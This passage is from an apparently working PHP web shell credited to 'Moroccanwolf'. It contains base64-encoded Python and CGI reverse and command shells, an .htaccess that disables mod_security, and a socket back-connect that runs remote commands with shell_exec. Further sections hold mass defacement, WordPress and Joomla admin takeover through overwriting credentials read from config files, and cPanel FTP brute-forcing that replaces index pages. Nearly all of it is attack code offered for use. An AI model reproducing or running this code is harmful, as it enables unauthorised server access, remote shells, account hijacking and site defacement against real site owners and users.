Pg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImtrayIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KDQo/Pg==";



$file = fopen("mwolf.php" ,"w+");
$write = fwrite ($file ,base64_decode($kkk));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Perl Back-Connect (BACkDOOR)</h6></span><center><center><br><iframe src=bconperl/mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 

}


elseif(isset($_GET['bcon']) && $_GET['bcon'] == "pyt"){

@mkdir('bconpython', 0755);
@chdir('bconpython');

$nnnn = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>"; 


$bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
   
fwrite ( $bbnn , $nnnn ) ;
fclose ($bbnn);
//back connect python
$lalala ='IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';

$kk = fopen("bconpython.py" ,"w+");
$write = fwrite ($kk ,base64_decode($lalala));
fclose($kk);

@chmod("bconpython.py",0755);

$kkk ="
PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcHl0aG9uIGJjb25weXRob24ucHkgW2lwXSBbUG9ydF08L2gzPjwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJra2siIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCg0KPz4=";

$file = fopen("mwolf.php" ,"w+");
$write = fwrite ($file ,base64_decode($kkk));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Python Back-Connect</h6></span><center><center><br><iframe src=bconpython/mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 

}
elseif(isset($_GET['bcon']) && $_GET['bcon'] == "smp")
    {
     if (isset($_POST['done']) &&   $_POST['port'] != "" &&  $_POST['ip'] != ""){
        ini_set('max_execution_time',0);

        echo "<p><h3>The Program is now trying to connect!</h3></p>";
        $ip = $_POST['ip']; 
        $port=$_POST['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p><h3>Fatal : An unexpected error was occured when trying to connect!</h3></p>";
        } 
        else
        { 
            fputs ($sockfd ,
            "\n=================================================================\n
            Coded by Moroccanwolf\n
            @@author : Moroccanwolf
            @@facebook : facebook.com/Mwolfprogrammer
            @@Email : moroccanxhack@gmail.com
            \n=================================================================\n");
         $pwd = shell_exec("pwd");
         $sysinfo = shell_exec("uname -a");
         $id = shell_exec("id");
         $dateAndTime = shell_exec("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(Shell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
         } 
         fclose($sockfd); 
        } 
    }
    else
    {
    ?>
    <h6>Simple Back-connect:</h6>
    <table align="center" >
         <form method="POST">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>IP </td>
                    <td><input style="width: 100px;" name="ip" size='5' value="127.0.0.1"/>
                </tr>
                <tr>
                <td>
                <input style="width: 90px;" class="own" name="done" type="submit" value="Connect back :D !"/>
                </td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
  
<?php

    
}


}
echo '
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';

}
if (isset($_GET['about'])){

echo '
<img src="https://cdn0.iconfinder.com/data/icons/animal-archetypes/512/wolf-512.png" width="300" height="235" />
<h5>This Shell Has Been Coded By Moroccanwolf (Moroccan Programmer)<br>

                                        I\'m a 15 years old security fan, I like to understand things in depth, for me, the real knowledge is not defacing, I now think you\'ll waste your time, by putting a page
                                                        \'Hacked by xxx, nothing system is secure\' the real knowledge in hacking has no limits, for me the real hacking is a way of thinking, a way of liking understand things in depth, like learning C language (PHP has mainly been coded in C,
                                                        your operating system has mainly been coded in C). A real hacker knows his computer\'s secrets, defacing is a shame on this world, however, it\'s one of my interest, I just say this to show to you i\'m awake of what I did and what I\'ll probably continune to do when I
                                                        have free time

</h5>
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';

}


if (isset($_GET['mass'])){
echo '
<br>
<b class="mekki" align="center">
<a href="?mass=cp">Mass Cpanel (Ftp Method)</a><br><br>
<a href="?mass=wp">Mass Login Wordpress</a><br><br>
<a href="?mass=jom">Mass Login Jommla</a><br><br>
<a href="?mass=dir">Mass Deface Dir</a><br><br>';

if(isset($_GET['mass']) && $_GET['mass'] == "dir"){

echo "<h6>Mass Directory:</h6>";
echo "<center><textarea rows='10' cols='100'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/index.html";
                                echo "<h3> $newfile </h3>\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "<h3>failed to copy $file...</h3>\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>
<br><br>
<center>
  </div>
<form action="<?php basename($_SERVER['PHP_SELF']); ?>" method='post'>
<div class="style31">
<h3>[+] Main Directory:   <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
[+] Defacement Url:   <input type='text' style='width: 250px' name='massdefaceurl'>
<input type='submit' name='execmassdeface' value='Execute'></div>
  </form></td></center></h3>
 


<?php
}
elseif(isset($_GET['mass']) && $_GET['mass'] == "jom"){

echo '
 
 <center><h6>Mass Joomla :</h6> <form class="wolf1" action="" method="POST">
<table><tbody><tr><td>config :</td><td><input size="26" class="inputz" type="text" name="config" value=""></td></tr><tr><td>user:</td><td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr><tr><td>pwd:</td><td><input class="inputz" type="text" size="26" name="pwd" value="wolf"></td></tr><tr><td>Kill : </td><td><input class="inputzbut" type="submit" name="fuck" value=" change "></td></tr></tbody></table></form></center>';
                        
                          function Find($str,$start,$end){
                          $len = strlen($str);
                          $start_pos = (strpos($str,$start) + strlen($start));
                          $str = substr($str,$start_pos);
                          $end_pos = strpos($str,$end);
                          $str = substr($str,0,$end_pos);
                          return $str;    
                                       }  

      $config = $_POST['config'];
                        $user = $_POST['user']; 
                        $pass = $_POST['pwd']; 
                     
                       if (isset($_POST['fuck'])){
                        $cnf = file_get_contents($config);
                        $username=Find($cnf,"\$user = '","'");
      $password=Find($cnf,"\$password = '","'");
      $dbname=Find($cnf,"\$db = '","'");
      $prefix=Find($cnf,"\$dbprefix = '","'");
      
      
      $link=@mysql_connect("localhost",$username,$password);
      
      if ($link) 
      {
        $hash = md5($user);
        mysql_select_db($dbname,$link) ;
        $tab = $prefix.'users';     
        $query2   = @mysql_query("UPDATE `$tab`  SET `username` ='$user'");
        $query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
        
      echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 

color="green">success..</font><br>';

      }else{
        echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 

fail</font></td>';
      }
      
  }
    
}
      


elseif(isset($_GET['mass']) && $_GET['mass'] == "wp"){

echo '
 
 <center><h6>Mass Wordpress :</h6> <form class="wolf1" action="" method="POST">
<table><tbody><tr><td>config :</td><td><input size="26" class="inputz" type="text" name="config" value=""></td></tr><tr><td>user:</td><td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr><tr><td>pwd:</td><td><input class="inputz" type="text" size="26" name="pwd" value="wolf"></td></tr><tr><td>Kill : </td><td><input class="inputzbut" type="submit" name="fuck" value=" change "></td></tr></tbody></table></form></center>';

                     function Find($str,$start,$end){
                          $len = strlen($str);
                          $start_pos = (strpos($str,$start) + strlen($start));
                          $str = substr($str,$start_pos);
                          $end_pos = strpos($str,$end);
                          $str = substr($str,0,$end_pos);
                          return $str;    
                                       }  

        
      $config = $_POST['config'];
                        $nuser = $_POST['user']; 
                        $npwd = $_POST['pwd']; 
                        if (isset($_POST['fuck'])){
                        

      $cnf = file_get_contents($config);
      $hostname = Find($cnf,"define('DB_HOST', '","');");
      $username = Find($cnf,"define('DB_USER', '","');");
      $password = Find($cnf,"define('DB_PASSWORD', '","');");
      $dbname = Find($cnf,"define('DB_NAME', '","');");
      $prefix = Find($cnf,"table_prefix  = '","'");
      
      $link=@mysql_connect($hostname,$username,$password);
                         
      
      if ($link) 
      {
        $hash = crypt($npwd);
        mysql_select_db($dbname,$link) ;
        $tab = $prefix.'users';     
        $query2   = @mysql_query("UPDATE `$tab`  SET `user_login` ='$nuser'");
        $query3  = @mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
        $req =@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
        $data = mysql_fetch_array($req);
        $site_url=$data["option_value"];
        
        error_reporting(0);
        echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$site_url.'/wp-login.php>'.$site_url.'/wp-login.php</a></td><td><font 

color="green"> =>success..</font></td>';
        
      }else{
        echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 

false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 

fail</font></td>';
      }
    
      
    
    
    
}
    

}



elseif ($_GET['mass'] == "cp"){
?>

<h6>Mass Cpanel :</h6>
<form method="post">

<h3>IP Server:<input type="text" name="ip" value="127.0.0.1" />
<p>&nbsp;</p>
User's List:<br>
<textarea rows="10" style="width:40%;" name="users" value="The Users List"></textarea>
<p>&nbsp;</p>
Password's List:<br>
<textarea rows="10" style="width:40%;" name="passwords" value="The Password List"></textarea>
<p>&nbsp;</p>
Index File Name:<input type="text" name="index_name" value="index.txt" /><br>
<p>&nbsp;</p>
<input type="submit" name="forest" value="MASS" /><br><br></h3>
</form>

<?php


set_time_limit(0);

if(isset($_POST['forest'])){

$ip=trim($_POST['ip']);
$users = explode("\n",$_POST["users"]);
$passwords = explode("\n",$_POST["passwords"]);
$index_name=trim($_POST['index_name']);


foreach($users as $user){
foreach($passwords as $pass){
$connect_ip = ftp_connect($ip) or die("<h3>Couldn't Connect To $ip</h3>");
if(@ftp_login($connect_ip, trim($user), trim($pass))){
echo "<br>Connected To --> $ip@$user\n";
@ftp_delete($connect_ip,"index.*");
$deface = ftp_put($connect_ip, "/public_html/index.php" , $index_name, FTP_ASCII);
if($deface){
echo "<h3><br><font color=green> $user --> DefaceD With Success !!</font></h3>";
break;
}else{
echo "<h3><br><font color=red> $user --> Error In Defacing iT !!</font></h3>";
}
}else{
echo "<br><font color=red>Couldn't Connect To --> $ip@$user --> $pass</font>\n";
}
}
}
echo"<p>&nbsp;</p>";
echo "<br><font size=5><h3> ! Mass Defacing Was Done ! </h3></font>";
echo"<p>&nbsp;</p>";
}



?>



<?php
}
echo '
<br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';


}

if (isset($_GET['cgi'])){
echo '<h6>CgiShell</h6><div class=content>';

@mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5w
cml2OCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdl
IG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdv
cmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3
b3JkID0gInByaXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhp
cw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2Ug
dGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3Jp
cHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBv
biBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENt
ZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1h
bmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNl
cCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRz
DQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJh
dGlvbiA9IDEwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxl
ZA0KCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJ
CQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCSMgdGFr
ZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkjIFRoaXMgaXMgdmFs
aWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZl
cnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRh
IGlzIHNlbnQgdG8gdGhlDQoJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBv
dGhlcndpc2UNCgkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQN
CgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkj
IHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCSMgaXMgYmVp
bmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUg
VU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5U
ID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDog
InB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9
ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJz
ZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlw
YXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZp
bGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRp
bnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAk
aW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3Rl
OiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBD
R0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7
DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwp
Ow0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0
aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9N
RVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0N
CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUo
U1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGlu
LCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBk
YXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBi
b3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZl
ciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhl
YWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0K
CQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMg
